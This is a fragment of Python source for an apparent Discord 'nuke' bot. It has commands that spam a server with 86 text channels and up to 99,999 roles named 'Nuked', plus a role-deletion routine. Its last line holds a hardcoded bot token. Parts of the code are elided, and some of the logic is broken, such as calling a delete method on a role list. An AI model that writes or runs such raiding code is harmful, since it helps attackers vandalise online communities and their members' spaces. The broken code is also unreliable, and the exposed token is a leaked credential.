...
async def nuke(ctx):
    ...
    n=0
    while(n<=85):
        await guild.create_text_channel('NUKEDDDDD') # Decide what should be the name of the text channels that you will create
        n = n+1
...
async def role(ctx, choice):
    if choice == 'create':
        ...
        for i in range(1, 100000):
            await ctx.guild.create_role(name=f'Nuked {i}')
    elif choice == 'delete':
        print('Deleting all roles...')
        roles = ctx.guild.roles
        roles.delete(999999)
        for role in roles:
            if ctx.guild.me.roles[-100] > role:
                await role.delete()
            else:
                break
    else:
...
client.run('OTAxNDY0MzUwNjEzNzA0NzM0.YXQQGQ.oGK6ZO0OaNfAN0hP6D88mnTS63Y')
